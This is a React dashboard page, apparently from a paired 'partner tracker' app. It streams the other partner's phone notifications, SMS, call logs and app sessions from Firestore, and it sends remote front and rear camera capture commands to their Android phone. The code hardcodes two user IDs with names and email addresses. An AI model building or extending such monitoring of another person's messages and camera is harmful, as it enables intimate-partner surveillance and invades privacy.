import {
  useCallback,
  useEffect,
  useRef,
  useState,
  type ReactNode,
} from 'react';
import {
  collection,
  doc,
  limit,
  onSnapshot,
  orderBy,
  query,
  serverTimestamp,
  setDoc,
  where,
} from 'firebase/firestore';
import { useNavigate } from 'react-router-dom';
import {
  Activity,
  AlertCircle,
  Aperture,
  Bell,
  Camera,
  CheckCircle2,
  Download,
  Maximize2,
  Monitor,
  RefreshCw,
  Smartphone,
  X,
} from 'lucide-react';
import { formatDistanceToNow, format } from 'date-fns';
import { db } from '../firebase';
import type { EventType, TrackerEvent, RemoteImage } from '../types';
import Header from '../components/Header';
import EventFilters from '../components/EventFilters';
import EventCard from '../components/EventCard';
import { useAuth } from '../context/AuthContext';

interface Filters {
  eventTypes: EventType[];
  appLabel: string | null;
  dateRange: 'today' | '7d' | '30d' | 'all';
  search: string;
}

interface StatItem {
  label: string;
  value: number;
  icon: ReactNode;
  gradient: string;
  accent: string;
}

const PARTNER_UIDS: Record<string, string> = {
  y22eIUbwtxdmZFRtDSKabmgXrWQ2: 'YLf3pl5On7S68Nnvlh50q4TP7Dv2',
  YLf3pl5On7S68Nnvlh50q4TP7Dv2: 'y22eIUbwtxdmZFRtDSKabmgXrWQ2',
};

function toMillis(value: unknown): number | null {
  if (typeof value === 'number') {
    return Number.isFinite(value) ? value : null;
  }
  if (typeof value === 'string') {
    const parsed = Date.parse(value);
    return Number.isNaN(parsed) ? null : parsed;
  }
  if (value instanceof Date) {
    const parsed = value.getTime();
    return Number.isNaN(parsed) ? null : parsed;
  }
  if (value !== null && typeof value === 'object') {
    const timestamp = value as {
      toMillis?: () => number;
      seconds?: number;
    };
    if (typeof timestamp.toMillis === 'function') {
      try {
        const parsed = timestamp.toMillis();
        return Number.isFinite(parsed) ? parsed : null;
      } catch {
        return null;
      }
    }
    if (typeof timestamp.seconds === 'number') {
      return timestamp.seconds * 1000;
    }
  }
  return null;
}

function formatTimestamp(value: unknown): string {
  const millis = toMillis(value);
  if (millis === null) return 'Unknown date';
  const d = new Date(millis);
  return `${format(d, 'MMM d, yyyy • h:mm a')}`;
}

/** Utility to download base64 image directly as a JPEG file */
function downloadImage(img: RemoteImage) {
  const link = document.createElement('a');
  link.href = `data:image/jpeg;base64,${img.imageBase64}`;
  const dateStr = new Date(img.timestamp).toISOString().replace(/[:.]/g, '-');
  link.download = `tracker-photo-${img.lensFacing}-${dateStr}.jpg`;
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
}

function SkeletonLoader() {
  return (
    <div className="space-y-3">
      {[1, 2, 3, 4, 5].map((i) => (
        <div
          key={i}
          className="p-4 rounded-2xl bg-white/[0.02] border border-white/[0.04] flex items-center gap-4 animate-pulse"
        >
          <div className="w-12 h-12 rounded-2xl bg-white/[0.06] shrink-0" />
          <div className="flex-1 space-y-2.5">
            <div className="h-4 w-40 bg-white/[0.06] rounded-md" />
            <div className="h-3 w-64 bg-white/[0.04] rounded-md" />
          </div>
        </div>
      ))}
    </div>
  );
}

export default function EventsPage() {
  const { user } = useAuth();
  const navigate = useNavigate();

  const partnerUid = user ? PARTNER_UIDS[user.uid] ?? null : null;
  const partnerName =
    user?.uid === 'y22eIUbwtxdmZFRtDSKabmgXrWQ2' ? 'Amisha' : 'Parth';
  const partnerEmail =
    user?.uid === 'y22eIUbwtxdmZFRtDSKabmgXrWQ2'
      ? 'amisha@gmail.com'
      : 'parth@gmail.com';

  const [events, setEvents] = useState<TrackerEvent[]>([]);
  const [loading, setLoading] = useState(true);
  const [initialLoad, setInitialLoad] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [eventsLimit, setEventsLimit] = useState(25);
  const [newEventCount, setNewEventCount] = useState(0);
  const [connectionStatus, setConnectionStatus] = useState<
    'connected' | 'connecting' | 'error'
  >('connecting');

  const [filters, setFilters] = useState<Filters>({
    eventTypes: [],
    appLabel: null,
    dateRange: 'all',
    search: '',
  });

  const [remoteImages, setRemoteImages] = useState<RemoteImage[]>([]);
  const [remoteLoading, setRemoteLoading] = useState(true);
  const [remoteError, setRemoteError] = useState<string | null>(null);
  const [requestingCamera, setRequestingCamera] = useState<
    'front' | 'back' | null
  >(null);
  const [cameraMessage, setCameraMessage] = useState<string | null>(null);
  const [cameraError, setCameraError] = useState<string | null>(null);

  // Lightbox Modal State
  const [activePhoto, setActivePhoto] = useState<RemoteImage | null>(null);

  const prevIdsRef = useRef<string[]>([]);
  const initialLoadRef = useRef(true);
  const newEventTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const loadMoreRef = useRef<HTMLDivElement>(null);

  const handleFilterChange = useCallback((patch: Partial<Filters>) => {
    setFilters((previous) => ({ ...previous, ...patch }));
  }, []);

  // Listen to Escape key to close modal
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === 'Escape') setActivePhoto(null);
    };
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, []);

  // Subscribe to partner events in Firestore
  useEffect(() => {
    if (newEventTimeoutRef.current !== null) {
      clearTimeout(newEventTimeoutRef.current);
      newEventTimeoutRef.current = null;
    }

    if (!partnerUid) {
      setEvents([]);
      setLoading(false);
      setInitialLoad(false);
      setConnectionStatus('error');
      setError(
        user
          ? 'Unable to determine your partner account. Check configuration.'
          : 'Please sign in to view activity.',
      );
      setNewEventCount(0);
      prevIdsRef.current = [];
      initialLoadRef.current = true;
      return;
    }

    initialLoadRef.current = true;
    prevIdsRef.current = [];
    setLoading(true);
    setInitialLoad(true);
    setConnectionStatus('connecting');
    setError(null);
    setNewEventCount(0);

    const eventsQuery = query(
      collection(db, 'events'),
      where('syncedByUid', '==', partnerUid),
      orderBy('observedAtUtc', 'desc'),
      limit(eventsLimit),
    );

    const unsubscribe = onSnapshot(
      eventsQuery,
      (snapshot) => {
        const rows = snapshot.docs.map(
          (document) =>
            ({
              id: document.id,
              ...document.data(),
            } as TrackerEvent),
        );

        if (initialLoadRef.current) {
          initialLoadRef.current = false;
          prevIdsRef.current = rows.map((event) => event.id);
          setInitialLoad(false);
        } else {
          const priorIds = new Set(prevIdsRef.current);
          const currentIds = rows.map((event) => event.id);
          const addedIds = currentIds.filter((id) => !priorIds.has(id));

          if (addedIds.length > 0) {
            setNewEventCount((count) => count + addedIds.length);

            if (newEventTimeoutRef.current !== null) {
              clearTimeout(newEventTimeoutRef.current);
            }

            newEventTimeoutRef.current = setTimeout(() => {
              setNewEventCount(0);
              newEventTimeoutRef.current = null;
            }, 4500);
          }

          prevIdsRef.current = currentIds;
        }

        setEvents(rows);
        setLoading(false);
        setConnectionStatus('connected');
        setError(null);
      },
      (snapshotError) => {
        console.error('Firestore events error:', snapshotError);
        setConnectionStatus('error');
        setLoading(false);
        setInitialLoad(false);

        if (snapshotError.code === 'permission-denied') {
          setError(
            'Access denied. Verify Firestore security rules and account authorization.',
          );
        } else if (snapshotError.code === 'failed-precondition') {
          setError(
            'The events query requires an active composite index in Firebase Console.',
          );
        } else {
          setError(
            snapshotError.message ||
              'Failed to stream partner activity. Reconnecting…',
          );
        }
      },
    );

    return () => {
      unsubscribe();
      if (newEventTimeoutRef.current !== null) {
        clearTimeout(newEventTimeoutRef.current);
        newEventTimeoutRef.current = null;
      }
    };
  }, [partnerUid, eventsLimit, user]);

  // Infinite Scroll Observer
  useEffect(() => {
    const node = loadMoreRef.current;
    if (!node || loading || events.length < eventsLimit) return;

    const observer = new IntersectionObserver(
      (entries) => {
        if (entries[0].isIntersecting) {
          setEventsLimit((previous) => previous + 25);
        }
      },
      { rootMargin: '250px' },
    );

    observer.observe(node);
    return () => {
      observer.unobserve(node);
      observer.disconnect();
    };
  }, [loading, events.length, eventsLimit]);

  // Subscribe to Remote Images
  useEffect(() => {
    if (!partnerUid) {
      setRemoteImages([]);
      setRemoteLoading(false);
      return;
    }

    setRemoteLoading(true);
    setRemoteError(null);

    const imagesQuery = query(
      collection(db, 'remote_images'),
      where('deviceId', '==', partnerUid),
      orderBy('timestamp', 'desc'),
      limit(50),
    );

    const unsubscribe = onSnapshot(
      imagesQuery,
      (snapshot) => {
        const rows = snapshot.docs.map(
          (imageDoc) =>
            ({
              id: imageDoc.id,
              ...imageDoc.data(),
            } as RemoteImage),
        );
        setRemoteImages(rows);
        setRemoteLoading(false);
        setRemoteError(null);
      },
      (snapshotError) => {
        console.error('Firestore remote images error:', snapshotError);
        setRemoteLoading(false);
        setRemoteError(
          snapshotError.code === 'permission-denied'
            ? 'Not authorized to view captured images.'
            : 'Unable to stream captured images.',
        );
      },
    );

    return () => unsubscribe();
  }, [partnerUid]);

  // Submit Photo Capture Request to Android Device
  const triggerRemoteCamera = useCallback(
    async (lensFacing: 'front' | 'back') => {
      if (!partnerUid || !user?.uid) {
        setCameraError('Sign in with an authorized account first.');
        return;
      }

      setRequestingCamera(lensFacing);
      setCameraMessage(null);
      setCameraError(null);

      try {
        const commandRef = doc(collection(db, 'remote_commands'));
        await setDoc(commandRef, {
          command: 'request_capture_photo',
          lensFacing,
          requestedBy: user.uid,
          requestedAt: serverTimestamp(),
          status: 'pending',
          deviceUid: partnerUid,
          requiresOwnerApproval: true,
        });

        setCameraMessage(
          `Photo capture request dispatched (${lensFacing} lens). Awaiting device response…`,
        );
      } catch (requestError) {
        console.error('Failed to send camera request:', requestError);
        setCameraError(
          requestError instanceof Error
            ? requestError.message
            : 'Failed to dispatch capture request. Check internet connection.',
        );
      } finally {
        setRequestingCamera(null);
      }
    },
    [partnerUid, user?.uid],
  );

  // Filter Logic
  const filteredEvents = events.filter((event) => {
    if (
      filters.eventTypes.length > 0 &&
      !filters.eventTypes.includes(event.eventType)
    ) {
      return false;
    }

    if (filters.appLabel && event.appLabel !== filters.appLabel) {
      return false;
    }

    if (filters.dateRange !== 'all') {
      const now = Date.now();
      let cutoff: number;

      if (filters.dateRange === 'today') {
        const startOfToday = new Date();
        startOfToday.setHours(0, 0, 0, 0);
        cutoff = startOfToday.getTime();
      } else if (filters.dateRange === '7d') {
        cutoff = now - 7 * 24 * 60 * 60 * 1000;
      } else {
        cutoff = now - 30 * 24 * 60 * 60 * 1000;
      }

      const observedAt = toMillis(event.observedAtUtc);
      if (observedAt === null || observedAt < cutoff) {
        return false;
      }
    }

    const searchTerm = filters.search.trim().toLowerCase();
    if (searchTerm) {
      const searchableText = [
        event.title,
        event.body,
        event.appLabel,
        event.packageName,
      ]
        .filter((val): val is string => typeof val === 'string' && val.length > 0)
        .join(' ')
        .toLowerCase();

      if (!searchableText.includes(searchTerm)) {
        return false;
      }
    }

    return true;
  });

  // Telemetry Cards
  const stats: StatItem[] = [
    {
      label: 'Total Activity',
      value: filteredEvents.length,
      icon: <Activity className="w-5 h-5 text-emerald-400" />,
      gradient: 'from-emerald-500/10 to-teal-500/5',
      accent: 'border-emerald-500/30',
    },
    {
      label: 'App Sessions',
      value: filteredEvents.filter(
        (e) =>
          e.eventType === 'APP_SESSION_START' ||
          e.eventType === 'APP_SESSION_END',
      ).length,
      icon: <Monitor className="w-5 h-5 text-sky-400" />,
      gradient: 'from-sky-500/10 to-blue-500/5',
      accent: 'border-sky-500/30',
    },
    {
      label: 'Notifications',
      value: filteredEvents.filter((e) => e.eventType === 'NOTIFICATION_POSTED')
        .length,
      icon: <Bell className="w-5 h-5 text-purple-400" />,
      gradient: 'from-purple-500/10 to-indigo-500/5',
      accent: 'border-purple-500/30',
    },
    {
      label: 'Calls & Messages',
      value: filteredEvents.filter(
        (e) =>
          e.eventType === 'CALL_LOG' ||
          e.eventType === 'SMS_RECEIVED' ||
          e.eventType === 'SMS_SENT',
      ).length,
      icon: <Smartphone className="w-5 h-5 text-amber-400" />,
      gradient: 'from-amber-500/10 to-orange-500/5',
      accent: 'border-amber-500/30',
    },
  ];

  return (
    <div className="min-h-screen flex flex-col bg-[#080C14] text-slate-100">
      <Header
        partnerName={partnerName}
        connectionStatus={connectionStatus}
      />

      {/* Floating New Events Toast */}
      {newEventCount > 0 && (
        <div className="fixed top-18 left-1/2 -translate-x-1/2 z-50 px-4 animate-slide-down-fade pointer-events-auto">
          <div className="flex items-center gap-2.5 px-4 py-2 rounded-full bg-emerald-500 text-black font-semibold text-xs shadow-2xl shadow-emerald-500/50">
            <span className="relative flex h-2 w-2">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-black opacity-75" />
              <span className="relative inline-flex rounded-full h-2 w-2 bg-black" />
            </span>
            <span>
              {newEventCount} new event{newEventCount === 1 ? '' : 's'} recorded
            </span>
          </div>
        </div>
      )}

      <main className="flex-1 pt-20 pb-16">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          
          {/* Top Status & Telemetry Header */}
          <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 mb-6 pb-5 border-b border-white/[0.06]">
            <div>
              <div className="flex items-center gap-2.5">
                <h1 className="text-2xl font-bold tracking-tight text-white flex items-center gap-2">
                  <span>{partnerName}'s Telemetry Feed</span>
                </h1>
                <span className="px-2.5 py-0.5 rounded-full text-xs font-mono font-medium bg-emerald-500/15 border border-emerald-500/30 text-emerald-400 flex items-center gap-1.5">
                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                  Live Sync
                </span>
              </div>
              <p className="text-xs text-slate-400 font-mono mt-1">
                Account Target: {partnerEmail}
              </p>
            </div>

            <div className="flex items-center gap-2">
              <button
                onClick={() => setEventsLimit((prev) => prev)}
                className="btn-modern-secondary text-xs py-2 px-3.5 flex items-center gap-2"
                title="Refresh Stream"
              >
                <RefreshCw className="w-3.5 h-3.5 text-slate-400" />
                <span>Refresh Stream</span>
              </button>
            </div>
          </div>

          {/* Error Banner */}
          {error && (
            <div
              className="mb-6 flex items-center gap-3 p-4 bg-rose-500/10 border border-rose-500/30 rounded-2xl text-rose-300 text-sm animate-fade-scale"
              role="alert"
            >
              <AlertCircle className="w-5 h-5 text-rose-400 shrink-0" />
              <p className="flex-1 font-medium">{error}</p>
            </div>
          )}

          {/* Telemetry Stat Cards */}
          <div className="grid grid-cols-2 lg:grid-cols-4 gap-3.5 mb-6">
            {stats.map((stat) => (
              <div
                key={stat.label}
                className={`p-4 rounded-2xl bg-gradient-to-br ${stat.gradient} border ${stat.accent} backdrop-blur-md shadow-lg shadow-black/20 flex items-center justify-between transition-transform duration-200 hover:-translate-y-0.5`}
              >
                <div>
                  <p className="text-[11px] font-mono uppercase tracking-wider text-slate-400 font-semibold">
                    {stat.label}
                  </p>
                  <p className="text-2xl font-bold font-mono text-white mt-1">
                    {stat.value}
                  </p>
                </div>
                <div className="p-2.5 rounded-xl bg-white/[0.06] border border-white/[0.08]">
                  {stat.icon}
                </div>
              </div>
            ))}
          </div>

          {/* Remote Camera Snapshot Controller */}
          <section className="p-5 rounded-2xl glass-card mb-6 border border-white/[0.08] relative overflow-hidden">
            <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
              <div>
                <div className="flex items-center gap-2">
                  <div className="p-2 rounded-xl bg-cyan-500/15 border border-cyan-500/30 text-cyan-400">
                    <Camera className="w-4 h-4" />
                  </div>
                  <h2 className="text-base font-bold text-white tracking-tight">
                    Remote Camera Controller
                  </h2>
                </div>
                <p className="text-xs text-slate-400 mt-1 max-w-xl">
                  Send a photo capture instruction directly to {partnerName}'s Android phone. Photos are securely uploaded to the private vault below.
                </p>
              </div>

              {/* Action Buttons */}
              <div className="flex items-center flex-wrap gap-2.5 shrink-0">
                <button
                  type="button"
                  onClick={() => void triggerRemoteCamera('front')}
                  disabled={requestingCamera !== null || !partnerUid}
                  className="btn-modern-primary text-xs py-2 px-3.5 flex items-center gap-2 cursor-pointer"
                >
                  <Aperture className="w-4 h-4" />
                  <span>Request Front Selfie</span>
                  {requestingCamera === 'front' && (
                    <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                  )}
                </button>

                <button
                  type="button"
                  onClick={() => void triggerRemoteCamera('back')}
                  disabled={requestingCamera !== null || !partnerUid}
                  className="btn-modern-secondary text-xs py-2 px-3.5 flex items-center gap-2 cursor-pointer"
                >
                  <Camera className="w-4 h-4 text-slate-300" />
                  <span>Request Rear Camera</span>
                  {requestingCamera === 'back' && (
                    <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                  )}
                </button>
              </div>
            </div>

            {/* Status Messages */}
            {cameraMessage && (
              <div className="mt-4 p-3 rounded-xl bg-emerald-500/10 border border-emerald-500/25 flex items-center gap-2 text-xs text-emerald-300 animate-fade-scale">
                <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
                <span>{cameraMessage}</span>
              </div>
            )}
            {cameraError && (
              <div className="mt-4 p-3 rounded-xl bg-rose-500/10 border border-rose-500/25 flex items-center gap-2 text-xs text-rose-300 animate-fade-scale">
                <AlertCircle className="w-4 h-4 text-rose-400 shrink-0" />
                <span>{cameraError}</span>
              </div>
            )}
          </section>

          {/* Captured Photos Gallery */}
          <section className="p-5 rounded-2xl glass-card mb-6 border border-white/[0.08]">
            <div className="flex items-center justify-between mb-4">
              <div className="flex items-center gap-2">
                <div className="p-2 rounded-xl bg-purple-500/15 border border-purple-500/30 text-purple-400">
                  <Aperture className="w-4 h-4" />
                </div>
                <div>
                  <h2 className="text-base font-bold text-white tracking-tight flex items-center gap-2">
                    <span>Captured Photos Vault</span>
                    <span className="text-xs font-mono font-normal text-slate-400">
                      ({remoteImages.length})
                    </span>
                  </h2>
                </div>
              </div>

              {remoteLoading && (
                <span className="text-xs font-mono text-amber-400 flex items-center gap-1.5 animate-pulse">
                  <RefreshCw className="w-3 h-3 animate-spin" />
                  Syncing Photos…
                </span>
              )}
            </div>

            {remoteError ? (
              <p className="text-xs text-rose-400 p-3 bg-rose-500/10 rounded-xl">
                {remoteError}
              </p>
            ) : remoteLoading && remoteImages.length === 0 ? (
              <div className="py-8 text-center text-slate-400 text-xs">
                Checking vault for uploaded photos…
              </div>
            ) : remoteImages.length === 0 ? (
              <div className="py-10 text-center rounded-2xl bg-white/[0.02] border border-white/[0.04]">
                <Camera className="w-8 h-8 text-slate-500 mx-auto mb-2 opacity-50" />
                <p className="text-sm font-medium text-slate-300">
                  No photos in vault yet
                </p>
                <p className="text-xs text-slate-400 mt-1 max-w-sm mx-auto">
                  Click 'Request Front Selfie' or 'Request Rear Camera' above to initiate photo capture.
                </p>
              </div>
            ) : (
              <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-3.5">
                {remoteImages.map((img) => (
                  <div
                    key={img.id}
                    className="group relative rounded-2xl overflow-hidden border border-white/[0.08] hover:border-white/[0.24] bg-black/60 shadow-md transition-all duration-300 hover:shadow-2xl hover:shadow-black/60 hover:-translate-y-1"
                  >
                    {/* Image Aspect Box */}
                    <div className="aspect-square relative overflow-hidden bg-slate-900">
                      <img
                        src={`data:image/jpeg;base64,${img.imageBase64}`}
                        alt={`${img.lensFacing} camera`}
                        className="w-full h-full object-cover transition-transform duration-500 group-hover:scale-108"
                        loading="lazy"
                      />

                      {/* Top Lens Badge */}
                      <div className="absolute top-2 left-2 z-10">
                        <span className="px-2 py-0.5 rounded-full text-[10px] font-mono font-semibold uppercase tracking-wider bg-black/70 backdrop-blur-md text-white border border-white/20">
                          {img.lensFacing === 'front' ? '🤳 Front' : '📸 Rear'}
                        </span>
                      </div>

                      {/* Hover Overlay with Action Buttons */}
                      <div className="absolute inset-0 bg-gradient-to-t from-black/90 via-black/40 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-200 flex flex-col justify-end p-2.5 z-20">
                        <div className="flex items-center justify-between gap-1 mb-2">
                          
                          {/* Fullscreen Preview Action */}
                          <button
                            type="button"
                            onClick={() => setActivePhoto(img)}
                            className="p-2 rounded-xl bg-white/20 hover:bg-white/30 text-white backdrop-blur-md transition-colors cursor-pointer"
                            title="View Fullscreen"
                          >
                            <Maximize2 className="w-3.5 h-3.5" />
                          </button>

                          {/* Direct Download Button (Requested) */}
                          <button
                            type="button"
                            onClick={(e) => {
                              e.stopPropagation();
                              downloadImage(img);
                            }}
                            className="flex items-center gap-1 px-2.5 py-1.5 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-black font-semibold text-xs transition-colors shadow-lg shadow-emerald-500/30 cursor-pointer"
                            title="Download Image"
                          >
                            <Download className="w-3.5 h-3.5" />
                            <span>Download</span>
                          </button>
                        </div>

                        <p className="text-[10px] text-slate-300 font-mono truncate">
                          {formatDistanceToNow(new Date(img.timestamp), {
                            addSuffix: true,
                          })}
                        </p>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </section>

          {/* Filter Bar */}
          <EventFilters
            filters={filters}
            onChange={handleFilterChange}
            events={events}
          />

          {/* Activity Stream Section */}
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center gap-3">
              <h2 className="text-base font-bold text-white tracking-tight flex items-center gap-2">
                <span>Real-Time Activity Stream</span>
                <span className="text-xs font-mono font-medium text-slate-400 px-2 py-0.5 rounded-md bg-white/[0.05] border border-white/[0.08]">
                  {filteredEvents.length} events
                </span>
              </h2>
            </div>
          </div>

          {/* Events Feed Container */}
          {loading && initialLoad ? (
            <SkeletonLoader />
          ) : filteredEvents.length === 0 ? (
            <div className="p-12 text-center rounded-2xl glass-card border border-white/[0.08]">
              <Activity className="w-10 h-10 text-slate-500 mx-auto mb-3 opacity-60" />
              <h3 className="text-base font-semibold text-white">
                No matching events
              </h3>
              <p className="text-xs text-slate-400 mt-1 max-w-sm mx-auto">
                No telemetry matching the current filters has been observed on{' '}
                {partnerName}'s device.
              </p>
            </div>
          ) : (
            <div className="space-y-3">
              {filteredEvents.map((event, index) => (
                <EventCard
                  key={event.id}
                  event={event}
                  onClick={() => navigate(`/event/${event.id}`)}
                  index={index}
                />
              ))}
            </div>
          )}

          {/* Infinite Scroll Anchor */}
          <div ref={loadMoreRef} className="mt-8 text-center py-4">
            {events.length >= eventsLimit && loading ? (
              <div className="inline-flex items-center gap-2 text-xs font-mono text-slate-400 px-4 py-2 rounded-full bg-white/[0.04]">
                <RefreshCw className="w-3.5 h-3.5 animate-spin text-emerald-400" />
                <span>Streaming older activity…</span>
              </div>
            ) : events.length >= eventsLimit ? (
              <span className="text-xs font-mono text-slate-400">
                Scroll down to load more activity
              </span>
            ) : null}
          </div>

        </div>
      </main>

      {/* Lightbox Photo Modal */}
      {activePhoto && (
        <div
          className="fixed inset-0 z-50 bg-black/90 backdrop-blur-2xl flex items-center justify-center p-4 animate-fade-scale"
          onClick={() => setActivePhoto(null)}
        >
          <div
            className="relative max-w-3xl w-full bg-[#0E1524] border border-white/[0.12] rounded-3xl overflow-hidden shadow-2xl flex flex-col max-h-[90vh]"
            onClick={(e) => e.stopPropagation()}
          >
            {/* Modal Header */}
            <div className="flex items-center justify-between px-6 py-4 border-b border-white/[0.08] bg-white/[0.02]">
              <div className="flex items-center gap-3">
                <span className="px-3 py-1 rounded-full text-xs font-mono font-semibold uppercase bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">
                  {activePhoto.lensFacing === 'front'
                    ? '🤳 Front Camera'
                    : '📸 Rear Camera'}
                </span>
                <span className="text-xs text-slate-400 font-mono">
                  {formatTimestamp(activePhoto.timestamp)}
                </span>
              </div>

              {/* Action Buttons */}
              <div className="flex items-center gap-2">
                <button
                  type="button"
                  onClick={() => downloadImage(activePhoto)}
                  className="btn-modern-primary text-xs py-1.5 px-3 flex items-center gap-1.5 cursor-pointer"
                >
                  <Download className="w-3.5 h-3.5" />
                  <span>Download JPG</span>
                </button>

                <button
                  type="button"
                  onClick={() => setActivePhoto(null)}
                  className="p-1.5 rounded-xl bg-white/[0.06] hover:bg-white/[0.12] text-slate-400 hover:text-white transition-colors cursor-pointer"
                  aria-label="Close"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>
            </div>

            {/* Modal Body / Photo View */}
            <div className="p-4 flex items-center justify-center bg-black/50 overflow-hidden flex-1">
              <img
                src={`data:image/jpeg;base64,${activePhoto.imageBase64}`}
                alt="Captured Telemetry Photo"
                className="max-h-[65vh] w-auto max-w-full rounded-2xl object-contain shadow-2xl"
              />
            </div>

            {/* Modal Footer Metadata */}
            <div className="px-6 py-3 border-t border-white/[0.08] bg-white/[0.02] flex items-center justify-between text-xs font-mono text-slate-400">
              <span className="truncate">
                Device UID: {activePhoto.deviceId}
              </span>
              <span>
                Captured {formatDistanceToNow(new Date(activePhoto.timestamp), { addSuffix: true })}
              </span>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
